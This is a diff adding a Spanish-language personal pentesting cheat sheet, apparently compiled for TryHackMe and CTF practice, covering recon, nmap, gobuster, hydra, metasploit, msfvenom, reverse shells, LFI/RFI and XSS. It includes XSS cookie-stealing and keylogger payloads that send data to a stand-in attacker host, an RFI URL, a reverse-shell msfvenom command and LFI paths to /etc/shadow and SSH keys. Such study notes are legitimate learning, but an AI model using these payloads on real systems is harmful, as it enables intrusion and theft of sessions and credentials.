@@ -1,0 +1,415 @@
+https://blog.elhacker.net/2022/02/sistemas-vulnerables-para-practicar-legalmente-pentesting.html (maquinas CTF)
+
+
+https://explainshell.com/ (explicacion de comandos)!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr  (Comandos windows?)
+
+https://sansorg.egnyte.com/dl/bF4I3yCcnt/? Documento ROE Para hacer pruebas de penetracion
+
+####################### HERRAMIENTAS WEB #######################################################################
+
+https://www.base64decode.org/ 
+
+https://gchq.github.io/CyberChef/
+
+https://crackstation.net/
+
+https://mxtoolbox.com/
+
+https://dnsdumpster.com/
+
+https://zerodium.com/
+
+https://distrowatch.com/
+
+https://owasp.org/www-project-web-security-testing-guide/
+
+https://www.exploit-db.com/google-hacking-database
+
+https://docs.docker.com/engine/install/debian/#install-using-the-repository
+
+https://hub.docker.com/_/httpd
+
+https://subdomainfinder.c99.nl/
+
+https://whois.domaintools.com/
+
+https://osintframework.com/
+
+https://attack.mitre.org/groups/
+
+########### COMANDOS OPENVPN ################################################################################################################################################################################################################################################################################
+
+SINTAXIS NORMAL
+	
+	openvpn nombreArchivoVPN
+
+COMANDOS CUANDO NOS DA ERROR
+
+	sudo openvpn --config nombreArcvhivo.ovpn --data-ciphers AES-256-CBC (ERROR EN EL CIPHER)
+	sudo killall openvpn (matar todos los procesos de openvpn)
+	sysctl net.ipv6.conf.all.disable_ipv6=0 (error ipv6)
+
+
+########## Conexiones SSH ################################################################################################################################################################################################################################################################################
+
+ssh nombreUser@DireccionIP
+
+ssh pepe@10.10.125.24
+
+En linux tenemos las claves almacenadas de ssh en /home/NameUser/.ssh/id_rsa
+
+
+############# COMANDOS ####################################################################################################################################################################################################################################################################################
+
+dig axfr dominio (comando para obtener copia de todos los registros de DNS)
+
+
+############### NMAP #####################################################################################################################################################################################################################################################################################
+
+sudo nmap -sV -O IP (nmap sencillo)
+
+sudo nmap -sV -O --script vuln IP
+
+sudo nmap -vv -sV -sC IP
+
+#################### ENUMERACION DE RUTAS/DIRECTORIOS OCULTOS EN UNA URL ################################################################################################################################################################################################################################
+
+https://hackertarget.com/gobuster-tutorial/
+
+gobuster es una herramienta para enumerar directorios. Mirar su manual y muy importante el parametro -k para los protocolos https(errores de certificados)
+
+MODO DIR (busqueda de directorio)
+
+	gobuster dir --url http://10.10.142.250 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt  NOTA /directory-list-1.0.txt se puede cambiar y ir probando otros diccionarios
+
+MODO DNS(busca subdominios)
+
+	gobuster dns -d mydomain.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+MODO "VHOST"(Fuerza bruta de host virtual)
+	
+	gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+WPScan es una herramienta para enumerar vulnerabilidades en paginas de wordpress
+
+nikto herramienta escaner de vulnerabilidades
+
+
+############################# HERRAMIENTAS (Programas/Comandos/Web) #####################################################################################################################################################################################################################################
+
+maltego
+
+robtex
+
+sdone(heraamienta monitoreo )
+
+dnsdumpster
+
+nslookup
+
+enum4linux (enumeracion de informacion de los sitemas windows y samba) enum4linux -a IP
+
+scp (se utiliza para para transferir archivos de una maquina local a un servidor remoto de forma segura) scp archivo.xt usuario@IPDestino:/ruta/destino
+
+ntpdate
+
+snmp-check
+
+censys
+
+shodan
+
+netdiscover
+
+setxkbmap es(configuracion teclado en español)
+
+whatweb(te dice versiones etc)
+
+
+
+
+################################ REVERSE SHELL #############################################################################################################################################################################################################################################################
+
+PRACTICAR EN: https://tryhackme.com/room/introtoshells TAREA 13,14,15
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Podemos obtener rever shell con metasploit tambien, exploit/multi/handler
+
+NETCAT	
+	sudo nc -lvnp NumeoPuerto------ (Si el numero del puerto es inferior a 1024 se necesita el sudo)
+        	      	               |----- Esto nos abre el puerto indicado en escucha donde recibiremos la shell
+	sudo nc -lvnp 443  ------------
+
+VINCULACION DE SHELL
+
+Si suponemos que tenemos ya un puerto oyente y queremos conectarnos a el
+
+	nc <target-ip> <chosen-port>
+
+	nc 10.10.165.221 443
+
+ESTABILIZAR SHELL LINUX (TRATAMIENTO TTY INTERACTIVA)
+
+Tecnica piton: https://tryhackme.com/room/introtoshells
+
+SHELL BASH
+
+	python -c "import pty;pty.spawn('/bin/bash')"
+	ctrl+z
+	stty raw -echo; fg
+	reset
+	terminal type? Xterm 
+
+SHELL ZSH
+
+	python -c "import pty;pty.spawn('/bin/zsh')"
+	ctrl+z 
+	stty raw -echo; fg
+	reset
+	terminal type? Xterm 
+
+
+WINDOWS
+
+	Tecnica rlwrap: https://tryhackme.com/room/introtoshells
+
+OTRA TECNICA PARA LINUX
+
+	Tecnica socat: https://tryhackme.com/room/introtoshells
+	
+	Esta tecnica vimos con alejandro como cargar un archivo de nuestra maquina a la maquina atacante(Maquina THM DVWA)
+	
+	Hay que levantar un servidor python o apache(Python es temporal y apache es fijo)
+
+		sudo python3 -m http.server 80
+	
+
+SHELLS CIFRADOS, VER https://tryhackme.com/room/introtoshells, Tarea 7
+
+########## CIFRADOS Y HASHING ######################################################################################################################################################################################################################################################################
+
+https://www.base64decode.org/ 
+https://gchq.github.io/CyberChef/
+https://crackstation.net/
+https://hashcat.net
+https://hashes.com/
+https://jwt.io(Cookies JSON)
+
+CIFRAR: por ejemplo la A vale una F, la B vale una T
+
+HASH: son algoritmos matematicos, que independientemente de su entrada, siempre dara la misma longitud de salida
+
+JOHN THE RIPPER
+
+	john --wordlist=/usr/share/wordlists/rocyou.txt NombreArchivoContieneHash
+
+HYDRA
+
+	hydra -l nombreusuario/-L ruta/diccionario/usuarios -p contraseña/-P ruta/diccionario/contraseñas IP SERVICIO
+	hydra - jan -P /usr/shares/wordlists/rockyou.txt 10.10.142.250 ssh
+
+############# METASPLOIT ###########################################################################################################################################################################################################################################################################
+
+https://tryhackme.com/room/metasploitexploitation
+https://tryhackme.com/room/meterpreter
+
+Iniciar metasploit 
+	
+	sudo msfconsole
+
+ESCANEOS DE PUERTOS
+
+	search portscan
+	use 5
+	show options
+	set RHOSTS IP_Maquina_Objetivo
+
+SERVICIO UDP IDENTIFICATION
+	
+	scanner/discovery/udp_sweep
+
+ESCANEO SMB
+
+	search smb_enumshares, smb_version, smb_login
+
+
+
+############################### MSFVENOM ############################################################################################################################################################################################################################################################
+
+https://tryhackme.com/room/introtoshells Tarea 9
+
+Sintaxis estandar
+
+	msfvenom -p <PAYLOAD> <OPTIONS> 
+
+Por ejemplo para generar un windows x64 reverse shell en formato exe
+	
+	msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+
+
+CARGAS UTILES DIRECTAS O POR ETAPAS
+
+	POR ETAPAS: Hay dos tipos de cargas utiles, las que son por etapas se dividen en 2 pasos, el primero establece la conexion y el segundo una vez establecida la conexion hace una carga directa del payload que solicita la shell (Estas cargas se indican con / )
+
+	DIRECTA: Es la mas comun, y en el mismo proceso se solicita la conexion y la ejecucion de una shell  (Estas cargas se indican con un _ )
+
+
+########### EVASION DE REGLAS DE FILTRADO AL CARGAR ARCHIVOS ####################################################################################################################################################################################################################################
+
+Ver: https://tryhackme.com/room/uploadvulns
+
+EXTENSIONES DE ARCHIVO
+	
+	MIME: Content-Type: Extension  detectada del archivo cargado 
+	Listas blancas, listas negras y configuracion de las reglas 
+
+NUMEROS MAGICOS
+
+	Cadena de digitos hexadecimales
+	Con el comando file verificas el tipo de archivo
+	hexeditor para editar como hexadecimal
+
+
+################### AUDITORIAS WEB ###################################################################################################################################################################################################################################################################
+
+https://tryhackme.com/room/walkinganapplication
+https://portswigger.net
+https://portswigger.net/web-security/sql-injection/cheat-sheet(TRUCOS INYECTION SQL)
+https://wiki.owasp.org/index.php/OWASP_favicon_database (Base de datos de iconos de favicon, si tienen estos iconos es mas factible el ataque porque conoceremos el framework que utilizan)
+https://www.wappalyzer.com (Herramienta en linea que te ayuda a encontrar informacion sobre una URL)
+https://archive.org/web/ (Herramienta en line de registro de webs, se pueden encontrar una pagina del marca de hace 7 años por ejemplo y visitar como estaba ese dia exactamente)
+
+En github se puede buscar por el nombre de la empresa o sitios web para ver si utiliza algun repositorio alojado en github
+
+ffuf, dirb, gobuster son herramientas para descubrir posible contenido 
+
+	ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://mydominio/FUZZ
+
+	dirb http://mydominio/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+	gobuster dir --url http://mydominio/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+MANERAS DE VER CODIGO FUENTE DE UNA PAGINA
+	
+	Click derecho en la pagina y seleccionar ver codigo fuente
+	Poner source:https://mydominio.com El source: nos muestra el codigo fuente
+	En el menu del navegador buscar opcion de ver fuente de la pagina, a veces esta en submenus
+
+REVISAR SIEMPRE SI EXISTE mydominio/robots.txt para ver posibles directorios oculto y mydominio/sitemap.xml para ver todos los archivos  
+Importante saber que framework se utiliza y la version, esto lo podemos averiguar a traves de favicon, con curl, hay bastantes metodos 
+Utilizar google dorks para encontrar cosas sobre la web
+
+
+ENUMERACION DE SUBDOMINIOS (Exploremos 3 metodos diferentes de hacer esto)
+
+	Fuerza bruta
+	Osint
+	Virtual Host
+
+		
+	https://crt.sh (Pagina para ver info de certificado) Osint
+	https://ui.ctsearch.entrust.com/ui/ctsearchui (Pagina para ver info de certificado) Osint
+	site:*.dominio.com Buscar esto en google substituyendo dominio por la URL a verificar, nos mostrara todos los subdominios que tiene google rastreados Osint 
+	Dnsrecon herramient de enumeracion DNS mediante fuerza bruta con un diccionario de posibles subdominios
+	Sublist3r Herramienta automatizada para acelerar el proceso de descrubimientos de subdominios
+
+OMISION DE AUTENTICACION
+
+	Probar al registrarse nombres de usuario, si nos dice que ese usuario ya existe, ya tenemos un usuario al que poder atacar mediante fuerza bruta
+	Podemos utilizar ffuf para probar  con una lista de nombres de usuarios comunes
+
+		ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.169.2/customers/signup -mr "username already exists"
+	
+	Manipulacion de cookies
+
+IDOR(Insecure Direct Object Reference)
+
+	Hay que encontrar un parametro en la URL que al cambiar su valor nos muestre informacion que no deberiamos de ver          
+	http://online-service.thm/profile?user_id=1305        //En este caso al cambiar el valor del id por otro numero, podriamos ver informacion de otro usuario
+
+
+LFI (Local File Intrusion)
+
+	Podemos movernos por directorios del servidor que no deberiamos, podemos utilizar el inspeccionar del navegador, irnos al apartado de red y capturar la ruta donde intenta cargar el archivo cuando interactuamos con la pagina
+	http://webapp.thm/get.php?file=../../../../etc/passwd
+	
+	/etc/issue, /etc/profile, /proc/version, /etc/passwd, /etc/shadow, /root/.bash_history, /var/log/dmessage, /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log, C:\boot.ini
+
+	Hay varios metodos de vulnerrar el LFI ver mas info en https://tryhackme.com/room/fileinc
+
+RFI (Remote File Inclusion)
+
+	Consiste en poder añadir una url a la url objetivo para poder cargar archivos desde tu maquina a la maquina victima
+	http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt (Apartir del parametro de busqueda le inyectamos la url maliciosa)
+
+SSRF (Server-Side Request Forgery) Falsificacion de solicitudes del lado del servidor
+
+	Hay dos tipos de ataques SSRF, SSRE regular y Blind SSRF
+	https://tryhackme.com/room/ssrfqi
+
+
+
+############# 3 TIPOS DE ATAQUES PRINCIPALES XSS ########################################################################################################################################################################################################################################################
+
+-DOM(especial):utiliza el entorno HTML para ejecutar jS malicioso.Suele utilizar la etiqueta HTML<script></script>
+
+-XSS Persistente: Se ejecuta cuando el servidor carga la pagina que lo contiene.Normalmente en publicaciones de un blog
+
+-XSS Reflejado: jS que se ejecuta en el extremo del lado del cliente de la app web.Normalmente cuando el servidor no desinfecta datos de busqueda.
+
+PAYLOADS DE XSS
+
+ 	PRUEBA DE CONCEPTO (Proof Of Concept) Prueba de si podemos ejecutar un ataque xss
+
+		<script>alert('XSS');</script>
+
+	Robo de sesiones (Session Stealing) Robamos los detalles de la sesion como tokens de inicio de sesion que se almacenan a menudo en la maquina de destino con un script y nos manda de vuelta estos token a un sitio web bajo nuestro control
+	
+		<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>	
+
+	Registrador de claves (Key Logger) 
+
+		<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script> Registrador de teclas, nos enviara todo lo que se teclee en esa pagina a un servidor web bajo nuestro control
+
+	Logica de negocios (Business Logic) Atacar a un recurso de red en particular o una funcion de javascript Por ejemplo, imagine una función de JavaScript para cambiar la dirección de correo electrónico del usuario llamada user.changeEmail(). Su carga útil podría verse así
+
+		<script>user.changeEmail('attacker@hacker.thm');</script>
+	
+
+
+############ ESCALACION PRIVILEGIOS LINUX #########################################################################################################################################################################################################################################################
+
+https://tryhackme.com/room/commonlinuxprivesc
+https://tryhackme.com/room/linuxprivesc
+
+
+	sudo -l para ver los comandos que podemos lanzar como root en esa cuenta
+	
+CRON (Proceso de ejecucion que ejecuta comandos en fechas y horas programadas, util para ver procesos root automatizados)
+
+	cat /etc/crontab para ver que trabajos cron estan programados
+
+		sintaxis cron # m h dom mon dow comando de usuario
+
+
+############ EXPLOTACION DE BINARIOS ##############################################################################################################################################################################################################################################################
+
+https://gtfobins.github.io/
+
+############## WINDOWS ################################################################################################
+
+getuid saber usuario
+
+sysinfo
+
+crtl+z o background poner en segundo plano el proceso
+
+sessions para saber las sesiones que tenemos, estando fuera de meterpreter
+
+
+####################################################################################################################################################################################################################################################################
+
